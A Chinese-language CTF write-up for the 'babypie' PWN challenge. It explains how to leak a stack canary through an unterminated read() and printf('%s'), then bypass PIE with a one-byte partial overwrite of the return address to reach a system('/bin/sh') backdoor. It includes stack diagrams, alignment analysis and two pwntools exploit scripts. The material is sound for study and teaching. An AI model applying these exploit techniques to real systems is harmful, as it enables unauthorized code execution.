# 知识点

Stack

# 题目分析

分类：PWN / Stack。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [babypie](babypie)
- [exp.py](exp.py)

## 已有分析

- [babypie_wp.md](notes/babypie_wp.md)


### babypie Writeup — Canary 泄露 + Partial Overwrite 绕过 PIE

> **复盘入口：** `WP索引与复盘入口`。本题的 partial overwrite 只能在真实返回地址、覆盖长度和目标地址高位都经当前样本验证后使用。

> **旧样本画像（当前工作区缺少 ELF）：** 64-bit ELF，PIE + Canary + NX 全开；两次 `read()` + 一次 `printf("%s")` 曾被用作 Canary 泄露与一字节 partial overwrite 的利用假设。复现前先对当前附件运行 `file`、`checksec` 并核对反汇编，不能把旧样本地址和偏移当成现有附件事实。
>
> **相关笔记：** `保护机制详解`（Canary/PIE/NX）· `栈金丝雀` · `偏移量`（partial overwrite 原理）· `pwn119_wp`（fork 复用 canary）· `pwn118_wp`（GOT 劫持绕过 canary）· `PWN导航`

#### 一、题目概况

| 项目 | 说明 |
|------|------|
| 文件 | 旧样本 `babypie`（64-bit ELF、PIE、动态链接、stripped）；当前工作区未找到该 ELF，复现前需以实际附件核对 |
| 保护 | PIE + NX + Stack Canary 全开 |
| 漏洞 | `read()` 不补 null → `printf("%s")` 泄露 canary；第二次 `read()` 栈溢出 |
| 后门 | `PIE+0xa3e`：`system("/bin/sh")` |
| 目标 | 弹 shell |

#### 二、逆向分析

##### 2.1 主函数（PIE+0x960）

从 `objdump -d` 反汇编还原的逻辑：

```c
void vuln() {
    char buf[40];               // rbp-0x30（只清 0 了前 32 字节）

    // 设置无缓冲 I/O
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    // 清 buf 前 32 字节
    *(long*)(buf+0)  = 0;       // rbp-0x30
    *(long*)(buf+8)  = 0;       // rbp-0x28
    *(long*)(buf+16) = 0;       // rbp-0x20
    *(long*)(buf+24) = 0;       // rbp-0x18   ← buf[24:31]

    puts("Input your Name:");
    read(0, buf, 0x30);         // ★ 读 48 字节
    printf("Hello %s:\n", buf); // ★ read 不补 null → %s 可能泄露
    read(0, buf, 0x60);         // ★ 读 96 字节，全溢出

    // canary 检查
    if (canary != %fs:0x28) __stack_chk_fail();
}
```

##### 2.2 后门（PIE+0xa3e）

```asm
a3e: push   rbp
a3f: mov    rbp, rsp
a42: lea    rdi, [rip+0xd7]    ; "/bin/sh"
a49: call   system@plt
a4e: nop
a4f: pop    rbp
a50: ret
```

`system("/bin/sh")`，但部分覆盖目标是 `PIE+0xa3f`，即跳过 `push rbp` 后的指令入口；应以当前附件反汇编确认。

##### 2.3 栈帧布局

```
         低地址
         ┌───────────────────────┐
         │  buf[0..31]            │  rbp-0x30  ← movq $0 清零的 32 字节
         │  buf[32..39]           │  rbp-0x10  ← 未清零！栈残留垃圾数据
         ├───────────────────────┤
         │  canary[0..7]          │  rbp-0x08  ← canary[0]=0x00 (防字符串泄露)
         ├───────────────────────┤
         │  saved_rbp (8 字节)    │  rbp+0x00  ← 调用者的栈帧指针
         ├───────────────────────┤
         │  return_addr (8 字节)  │  rbp+0x08  ← PIE+0xa6a (call 的下一条)
         └───────────────────────┘
         高地址
```

> [!note] 区分“未初始化”与“本轮输入覆盖”
> 反汇编显示只清零了 `buf[0:32]`，所以 `buf[32:40]` 在输入前确实是未初始化内容。但预期第一阶段发送 41 个 `A`，且 `read` 实际返回至少 41 时，这 8 字节也会被覆盖成 `A`；因此不能把它们的旧值含 `\x00` 当成本轮泄露失败的原因。真正要检查的是 `read` 的返回长度、Canary 其余 7 字节是否含 NUL，以及 `%s` 的实际输出长度。

#### 三、基础知识：Stack Canary 是怎么工作的？

> **深入阅读：** `栈金丝雀`（Canary 完整原理）· `保护机制详解`（Canary/NX/PIE/RELRO 全家桶）· `x86-x64汇编速查`（leave/ret 指令）

##### 3.1 Canary 是什么？

Canary（栈金丝雀）的名字来自煤矿工人带金丝雀下井——金丝雀死 = 有毒气。Canary 是栈上的一个**随机值**，函数返回前检查它是否被改变。

```
┌──────────────────────────────────────────────────────────┐
│ 1. 程序启动时                                              │
│    内核提供 AT_RANDOM 随机字节 → glibc 动态加载器据此初始化 guard 并写入 TLS │
│    位置: %fs:0x28（x86-64） 或 %gs:0x14（x86-32）         │
├──────────────────────────────────────────────────────────┤
│ 2. 函数开头（prologue）                                    │
│    mov %fs:0x28, %rax    ← 从 TLS 读 canary              │
│    mov %rax, -0x8(%rbp)  ← 放在栈上 return_addr 之前      │
├──────────────────────────────────────────────────────────┤
│ 3. 函数结尾（epilogue）                                    │
│    mov -0x8(%rbp), %rcx  ← 从栈读回                       │
│    xor %fs:0x28, %rcx    ← 和 TLS 对比                    │
│    jne → __stack_chk_fail（不相等 → 溢出被检测到！）       │
└──────────────────────────────────────────────────────────┘
```

##### 3.2 为什么 canary 最低字节是 0x00？

```
64 位 canary:  [0x00] [rand] [rand] [rand] [rand] [rand] [rand] [rand]
                 ↑ LSB (最低有效字节，存在最低地址)
```

这是历史上为了降低某些 **NUL 结尾字符串读/拷贝** 泄露风险的设计：`printf("%s")`、`strcpy` 等会把 `\x00` 当字符串终点。但不能把它简化成“所有字符串输入都无法碰到 canary”：`gets()` 是从标准输入读到换行/EOF 后再写入终止符；原始字节接口 `read` / `recv` / `memcpy` 则按长度工作，照样能写过 `\x00`。关键永远是：**本题的输入 API 会不会接受 NUL，写入长度会不会跨过 guard。**

> 本题恰恰是利用了 null 字节：覆盖它让 `printf("%s")` 跨过去把后面的随机字节泄露出来。

#### 四、漏洞 ①：Canary 泄露（read 不补 null + printf %s）

> [!note] **🎯 为什么要泄露 canary？**
> 如果一次写入跨过 canary，且函数之后会走到 guard 检查，随机值被改掉便会触发失败路径。
> 所以**不能蒙着覆盖 canary**，必须知道它的确切值，原样写回去。
> 常见路线包括：① 格式化字符串读出栈数据（pwn118）；② 多次尝试/父子进程等条件下逐字节猜测（pwn119）；③ `read()` 未补终止符且后续 `printf("%s")` 从相邻位置越界读（本题）。第三种并不自动成立：要实测相邻布局、首次读入长度、输出起点和终止字节，并确认存在第二次可利用输入。

##### 4.1 `read()` 和 C 字符串的区别

| 函数 | 行为 | null 终止？ |
|------|------|------------|
| `fgets` | 读到 '\n' 或 size-1，自动加 '\0' | ✅ 是 |
| `scanf("%s")` | 读到空白字符，自动加 '\0' | ✅ 是 |
| **`read()`** | 读原始字节，不做任何处理 | ❌ 否 |

`read()` 读完就是原始数据，没有 null 终止符。这导致 `printf("%s", buf)` 会从 `buf` 开始一直打印直到在内存里碰见 `\x00`。

##### 4.2 泄露过程（逐字节）

```
step 1: 发送 b"A" * 41
         ┌──────────────────────────────────────────────┐
         │  AAAA...AAAA(40)  A  [canary_1] [canary_2]...[r]...  │
         └──────────────────────────────────────────────┘
         buf[0:40]        buf[40]   buf[41]...
         填满 buf         覆盖 canary[0]
                          本来是 0x00

step 2: printf("Hello %s:\n", buf)
         %s 从 buf[0] 开始打印，遇到 \x00 才停

         输出: "Hello AAAA...AAAA A [7_canary_bytes] [后续栈字节（若存在）] :\n"
               └───41 个 A───┘ └────────── 泄露数据 ───────────┘
                                  ↑                    ↑
                            canary[1:8]        内容和长度由栈帧及首个 NUL 决定
                            （若 7 字节中无 NUL）不用于本题 payload
```

> [!note] 后续栈字节不是固定长度的地址泄露
> 若 saved RBP 恰好是类似 `0x00007ffc12345678` 的用户栈地址，小端序字节为 `78 56 34 12 fc 7f 00 00`，`%s` 会在首个 `0x00` 处停止；这类样本常能看到前 6 个非零字节。但这不是“必定泄露 6 字节”的保证：地址、栈帧和此前内容都应现场检查。本题利用只需要 Canary，不依赖 saved RBP 泄露。

##### 4.3 重建 canary

```python
data = p.recvuntil(b":\n", drop=True)   # "Hello <leak>:"
canary = b"\x00" + data[41:48]          # 补回 \x00 + 7 字节泄露
```

`data[41:48]` = 紧随 41 个 A 之后的 7 个 canary 字节。LSB 被我们覆盖了，但它是常数 `0x00`，直接补回来就行。

#### 五、漏洞 ②：栈溢出 + Partial Overwrite 绕过 PIE

> **深入阅读：** `偏移量`（地址计算）· `ASLR详解`（PIE 和 ASLR 的关系）· `保护机制详解`（PIE 原理）

##### 5.1 第二次 read — 完全溢出

`read(0, buf, 0x60=96)` 能写 96 字节，覆盖范围：

```
buf[0..39]     → 我们的 40 字节 padding
buf[40..47]    → canary（必须写对，否则 __stack_chk_fail）
buf[48..55]    → saved_rbp（任意垃圾）
buf[56..63]    → return_addr（★ 攻击目标！）
```

##### 5.2 为什么 Partial Overwrite 能绕过 PIE？

> [!note] **🎯 为什么要用 partial overwrite 而不是直接写完整地址？**
> 写完整地址需要知道 PIE 基址。但我们只泄露了 canary，没泄露返回地址 → 不知道 PIE 基址。Partial overwrite 只改最低 1~2 字节，不需要知道基址。
> **一字节覆盖的前提**：目标和原返回地址除最低 8 bit 外必须完全相同；换句话说，二者的模块内偏移必须只差最低一个字节。本题样本计划从 `PIE+0xa6a` 改到 `PIE+0xa3f`，满足此条件。它们同页是一个有用线索，但**同一页本身不充分**：同页内偏移的 bit 8–11 也可能不同。

**PIE 随机化是以页（4096 字节 = 0x1000）为粒度的**。基址总是 0x1000 的倍数，所以：

```
PIE 基址:   0x???????000    ← 低 12 位永远是 0
返回地址:   PIE + 0xa6a    ← 低 12 位固定为 0xa6a
目标入口:   PIE + 0xa3f    ← 低 12 位固定为 0xa3f（跳过 push rbp）
```

两个地址的**只差在最低字节**：

```
0xa6a:  0000 1010 0110 1010
0xa3f:  0000 1010 0011 1111
        └──── 高 8 位相同 ────┘└ 低 8 位不同 ┘
```

我们只改最低 1 字节（从 `0x6a` 到 `0x3f`），其余字节保持不变——**不需要知道 PIE 基址**。这也是 partial overwrite 的核心：只改地址的低字节，因为只有那部分是我们确切知道的值。

> [!note] Partial Overwrite 适用条件
> 覆盖 N 个低字节时，目标和原地址在其余高字节必须相同；还要确认原返回地址的来源、实际只写了 N 字节、输入函数不会追加字节。此题只改最低一字节：`0xa6a` 与 `0xa3f` 的 bit 8 及以上相同。若目标是 `PIE+0x1??`、原地址是 `PIE+0x0??`，即使两者“看起来很近”，一字节也不够。

##### 5.3 为什么是 57 字节？

```
40 (buf) + 8 (canary) + 8 (saved_rbp) + 1 (partial overwrite) = 57 字节
```

> [!warning] read 不写剩余区域
> `read()` 只写它本次实际返回的字节数；本样本 payload 计划发送 57 字节，须确认目标确实完整读到 57 字节。这样返回地址的高 7 字节保持原样，最低字节改成 `0x3f`。

#### 六、历史 SIGSEGV 现象与栈对齐假设（待目标复验）

##### 6.1 现象

旧复现记录称，使用 `\x3e` 跳到函数入口 `0xa3e` 时进程收到 SIGSEGV；当前工作区无 ELF、core 或 GDB 现场，所以下面是待验证假设，不是已证实根因：

```
[+] Payload sent. Triggering backdoor...
[*] Process './babypie' stopped with exit code -11 (SIGSEGV)
```

仅凭 SIGSEGV 不能判断已经进入 `system()`，也不能单独证明是栈对齐。需要在目标 libc 下查看崩溃时的 `$rip`、反汇编和实际内存操作数。

##### 6.2 待验证假设：调用路径的栈对齐

```
x86-64 System V ABI 对普通函数调用点有栈对齐要求；具体崩溃仍须看目标路径与指令。

如果目标 libc 的实际路径执行对齐要求更严格的 SIMD 内存访问（例如 movaps）：
    movaps [实际地址], xmm0
    地址未对齐 → 可能 SIGSEGV

验证方法：GDB 断在真实崩溃点，执行 x/i $rip、info registers，并计算该条指令的实际内存操作数低 4 位。
```

##### 6.3 按旧样本指令推算栈相位

下面推算只在目标序言确为 `push rbp; mov rbp, rsp; sub rsp, 0x30`、尾声确为 `leave; ret` 且返回地址布局一致时成立；当前工作区无 ELF，不能视作本题附件的实测。

```
追踪 %rsp 的变化：

真实 main 调用 vuln:
    call vuln               → %rsp -= 8 （不对齐）

vuln prologue:
    push rbp                → %rsp -= 8 （恢复对齐！）
    mov rbp, rsp            → 建立当前函数的帧基址
    sub $0x30, rsp          → %rsp -= 0x30 (对齐，因为 0x30 是 16 的倍数)

我们的 leave; ret:
    leave = mov rsp, rbp; pop rbp
        mov rsp, rbp        → %rsp = rbp (对齐)
        pop rbp             → %rsp += 8 (不对齐！)
    ret                     → %rsp += 8 (恢复对齐)

跳转到 backdoor (0xa3e):
    push rbp                → %rsp -= 8 (不对齐！)  ← 问题在这
    ...
    call system             → 若当前栈相位不满足 ABI/目标指令约束，可能失败
```

##### 6.4 候选调整：跳过 push rbp

旧样本路线尝试跳到 `backdoor+1`（`0xa3e+1 = 0xa3f`）。必须先用 `x/2i backdoor` 确认它确实落在预期指令 `mov rbp, rsp`，并验证跳过 `push rbp` 后的代码不依赖该指令建立的栈帧：

```
跳转到 backdoor+1 (0xa3f):
    (没有 push rbp)         → %rsp 不变 (对齐)
    mov rbp, rsp            → 不影响 %rsp
    ...
    call system             → 按上述假设，call 点栈相位恢复为 ABI 预期；仍须在目标 libc 中验证
```

若验证通过，才把返回地址最低字节从 `0x3e` 改成 `0x3f`；对应 payload 最后一个字节写作 `b"\x3f"`。

> [!tip] 排查栈对齐问题的通用方法
> 1. GDB 里 `x/i $rip` 找到崩在哪条指令
> 2. 若是 `movaps` / `movdqa` 等指令访问内存，计算**实际内存操作数**（例如 `$rsp+0x40`）的低四位；只有它未对齐才是这类问题
> 3. 只有当前路径恰好差 8 字节时，才加一个单独 `ret` gadget；跳过函数序言也只能在反汇编确认该路径不依赖被跳过的建帧动作时使用

#### 七、复现脚本骨架（逐行讲解；目标附件尚未动态验证）

```python
from pwn import *
import os

context.arch = "amd64"
context.log_level = "info"

pwn = os.path.join(os.path.dirname(os.path.abspath(__file__)), "babypie")

### 每次启动是新进程；仅对本地样本重试不完整的字符串泄露。
for attempt in range(5):
    p = process(pwn)

    # ═══ 第 1 步：泄露 Canary ═══
    prompt = p.recvuntil(b"Input your Name:", timeout=3)
    if not prompt.endswith(b"Input your Name:"):
        p.close()
        raise RuntimeError("未收到输入提示；检查目标输出缓冲和运行环境")
    p.send(b"A" * 41)                     # ★ 关键！发 41 个 A
                                           # 前 40 字节填满 buf
                                           # 第 41 字节覆盖 canary 的 \x00

    greeting = p.recvuntil(b"Hello ", timeout=3)
    if not greeting.endswith(b"Hello "):
        p.close()
        raise RuntimeError("未收到 Hello 前缀；检查输出同步和目标行为")
    data = p.recvuntil(b":\n", drop=True, timeout=3)  # 去掉 printf 固定后缀
    # 预期 data 以 41 个 A 开头，后面至少有 7 个 Canary 字节；更后的内容不使用

    if not data.startswith(b"A" * 41) or len(data) < 48:
        p.close()
        # 输出不足可能来自 read 短读、Canary 高字节含 NUL、I/O 边界或目标差异；不猜缺失字节
        continue

    canary = b"\x00" + data[41:48]        # 覆盖掉的首字节按该样本的 guard 规则补回
    if len(canary) != 8:
        p.close()
        raise ValueError("Canary 长度异常；确认读入长度和目标栈布局")

    # 第二次 read 的实际控制数据布局：40 + 8 + 8 + 1 = 57 字节。
    # 仅在当前附件的反汇编确认返回地址来源和偏移后使用。
    payload  = b"A" * 40
    payload += canary
    payload += b"B" * 8                 # saved_rbp 占位；本路径不依赖其旧值
    payload += b"\x3f"                   # 单字节：只改返回地址最低字节 0x6a → 0x3f
    assert len(payload) == 57

    p.send(payload)                       # 本地样本；远程需确认第二次 read 收齐 57 字节
    p.interactive()                       # 仅当目标布局、I/O 与利用条件都匹配时，才可能进入 shell
    break

else:
    raise RuntimeError("连续尝试未取得完整 Canary 泄露；先检查目标布局和 read 返回长度")
```

#### 八、利用流程图

```
╔══════════════════════════════════════════════════════════════╗
║  Stage 1: Canary Leak                                       ║
╠══════════════════════════════════════════════════════════════╣
║  发送 41 字节: [A*40][A]                                     ║
║  ├─ buf[0:40] = 40 个 A（填满缓冲区）                        ║
║  └─ buf[40] = A（覆盖 canary[0]，本来是 \x00）              ║
║                                                              ║
║  printf("Hello %s:\n", buf)                                  ║
║  └─ %s 从 buf[0] 开始打印...                                 ║
║     "Hello "                                                 ║
║     + "A"*41            ← 我们发的                            ║
║     + canary[1:8]       ← 预期泄露 7 字节 Canary                 ║
║     + 后续栈字节        ← 若未遇 NUL 可能继续输出；利用不依赖它       ║
║     + ":\n"                                                   ║
║                                                              ║
║  解析: canary = \x00 + 泄露的 7 字节                          ║
╚══════════════════════════════════════════════════════════════╝
                          ↓
╔══════════════════════════════════════════════════════════════╗
║  Stage 2: Overflow + Partial Overwrite                       ║
╠══════════════════════════════════════════════════════════════╣
║  发送 57 字节:                                               ║
║  ┌──────────┬──────────┬──────────┬──────┐                   ║
║  │ "A"*40   │ canary(8)│ "B"*8    │ \x3f │                   ║
║  │ 填充buf   │ 通过检查  │ 假 rbp   │ 改返回 │                 ║
║  └──────────┴──────────┴──────────┴──────┘                   ║
║                                                              ║
║  leave; ret 后:                                              ║
║  rip = (PIE+0xa6a 改低字节 0x6a→0x3f) = PIE+0xa3f           ║
║  = backdoor+1；栈相位与跳过序言的正确性仍需目标 GDB 验证       ║
║                                                              ║
║  system("/bin/sh") → 🎉 shell                                ║
╚══════════════════════════════════════════════════════════════╝
```

#### 九、知识点总结

```
┌─────────────────────┬──────────────────────────────────────┐
│ 知识点               │ 原理                                 │
├─────────────────────┼──────────────────────────────────────┤
│ Canary 机制          │ TLS(%fs:0x28) 存随机值，函数返回前比对  │
│ Canary LSB = 0x00   │ 降低 NUL 终止字符串路径的误读风险；原始字节写入仍可跨过 │
│ read() vs fgets     │ `read` 不补终止符；后续字符串读取越界且未遇 NUL 才会泄露 │
│ PIE 页对齐           │ 基址低 12 位为 0；模块内偏移的低 12 位保持不变 │
│ Partial Overwrite   │ 覆盖 N 个低字节时，目标与原地址其余高字节必须一致 │
│ x86-64 栈对齐        │ 看实际内存操作数；不能只凭 `system` 名称断言 │
│ 修复栈对齐           │ 先量当前路径的 `%rsp`；需要时才加 ret 或在证据充分时跳过序言 │
│ setvbuf unbuffered  │ printf 立即输出，不缓冲               │
└─────────────────────┴──────────────────────────────────────┘
```

> [!tip] 同类题目
> Canary 泄露 + partial overwrite 是绕过“PIE + Canary”的一种经典组合，但不是固定模板。先分别验证：canary 是否能泄露、返回地址原值和目标是否只差可控低字节、输入函数是否恰好保留高字节。栈对齐不是只看 `system()` 或 one-gadget：当目标路径出现受对齐约束的内存访问时，才按实际 `%rsp` 计算与修复。

#### 十、把本题结论迁移前先核对

1. `checksec` 只说明二进制整体启用了保护；在目标函数反汇编中确认 guard 的保存、比较和失败路径。
2. 第一阶段发送 marker，记录 `recvuntil` 得到的**准确长度和字节**；不要把一次本地残留现象当成布局保证。
3. 在 GDB 中看 `x/gx $rbp+8` 的原返回地址，再计算它与目标地址除低 N 字节外是否一致。
4. 在实际崩点用 `x/i $rip` 找出内存操作数；例如指令访问 `$rsp+0x40` 时，用 `p/x (($rsp + 0x40) & 0xf)` 验证它是否对齐。`backdoor+1` 只是此样本的修复，不是通用偏移。

#### 十一、原理资料

- [GCC stack protector 选项](https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html)：哪些函数会被插入 guard，及检查失败后的语义。
- [glibc 的 `__stack_chk_fail` 源码](https://codebrowser.dev/glibc/glibc/debug/stack_chk_fail.c.html)：确认失败路径不会“修复后继续返回”。
- [Linux `read(2)`](https://man7.org/linux/man-pages/man2/read.2.html)：`read()` 最多读取请求长度，调用方不能把一次调用视为必定收齐。
- [x86-64 psABI：低层系统信息与栈帧约定](https://gitlab.com/x86-psABIs/x86-64-ABI/-/blob/master/x86-64-ABI/low-level-sys-info.tex)：函数调用前参数区按 ABI 对齐，入口处返回地址已压栈；本题具体相位仍需用目标汇编和 GDB 验证。
- `Canary详解`：将编译器、TLS 与 GDB 观察串起来。
- `ASLR详解`、`栈对齐问题`、`PWN输入输出与协议同步`：分别复查地址、对齐与 I/O 边界条件。

#### 相关代码与实战模板

- 本页模板入口：`pwntools EXP 启动骨架` · `GDB 观察模板`。
- 全局选择：`选择指南`；完整逐篇清单：`逐篇映射表`。
- 相关题目/WP：本页即题解；`全部题解索引`。
- 本页已有代码片段是教学/题解材料；除非验证报告明确记录对应目标和验收结果，不应视为可运行模板或 exploit 成功。


# EXP

- [exp.py](exp.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
#!/usr/bin/env python3
# babypie: 64-bit PIE+Canary. read 不补 null → %s 泄露 canary → 栈溢出 partial overwrite backdoor+1
from pwn import *
import os
from pathlib import Path

context.arch = "amd64"
context.log_level = "info"

pwn = os.path.join(os.path.dirname(os.path.abspath(__file__)), "babypie")
pwn_root = Path(__file__).resolve().parents[3]
loader = pwn_root / "libc/2.27/amd64/ld-linux-x86-64.so.2"
libdir = pwn_root / "libc/2.27/amd64/glibc227/glibc227-fixed/lib/x86_64-linux-gnu"

for attempt in range(5):
    p = process([str(loader), "--library-path", str(libdir), pwn])

    # leak canary: 41 bytes overwrites canary null byte → printf %s leaks rest
    p.recvuntil(b"Input your Name:")
    p.send(b"A" * 41)
    p.recvuntil(b"Hello ")
    data = p.recvuntil(b":\n", drop=True)
    canary = b"\x00" + data[41:48]

    if len(data) < 48:
        p.close()
        continue

    log.success(f"canary: {canary.hex()}")

    # overflow: 40 pad + canary + 8 junk + partial overwrite (0x6a→0x3f=backdoor+1)
    p.send(b"A" * 40 + canary + b"B" * 8 + b"\x3f")
    p.interactive()
    break
```
